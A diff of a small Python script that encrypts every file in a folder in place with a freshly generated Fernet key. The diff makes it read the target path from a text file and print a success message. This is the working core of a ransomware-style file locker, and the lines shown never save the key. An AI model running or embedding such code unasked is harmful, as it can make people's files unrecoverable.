@@ -3,12 +3,14 @@ from cryptography.fernet import Fernet
 
 finalenc = []
 #creates list that will be used to know what to encrypt
+myfile = open("example.txt")
+folder = myfile.read()
+myfile.close()
 
-folder = str(input("enter path for your folder here"))
 #defining the directory we want
 
 direc = os.listdir(folder)
-#sets the list of files as a varialbe
+
 
 os.chdir(folder)
 
@@ -25,7 +27,6 @@ for file in direc:
         direc.remove("gitignore") 
 
 
-print(direc)
 
 key = Fernet.generate_key()
 
@@ -40,3 +41,5 @@ for file in direc:
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
+
+print("encrypted succesfully")
